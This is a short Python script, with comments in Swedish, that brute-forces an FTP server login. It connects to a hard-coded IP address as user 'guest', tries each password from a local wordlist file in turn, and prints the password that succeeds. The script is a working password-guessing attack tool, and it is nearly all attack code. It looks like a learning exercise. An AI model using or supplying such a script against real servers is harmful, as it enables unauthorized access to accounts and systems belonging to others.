#importera FTP från modulen ftplib
from ftplib import FTP

#En funktion där vi loggar in oss på ftp servern
def connection(lines):
    host = FTP("3.23.5.245")
    log_in = host.login("guest", lines) # resultatet av guest som användare och lines som parameter
    print(f"[-] {log_in} The password is : {line} ") #skriver ut när lösenordet hittades och lyckades inloggning

#öppnar vi filen för lösenord lista.
with open("C:/Users/User-0462/Desktop/Desktop/passw", "r") as a_file:

    for line in a_file: # en for loop för att iterera genom lösenord listan
        try:       
            lines = line.strip()    
            connection(lines) #ropar på funktionen connection och skickar lösenordet som parameter
            break
        except:
            print(f"[-] Failed password: {lines}")
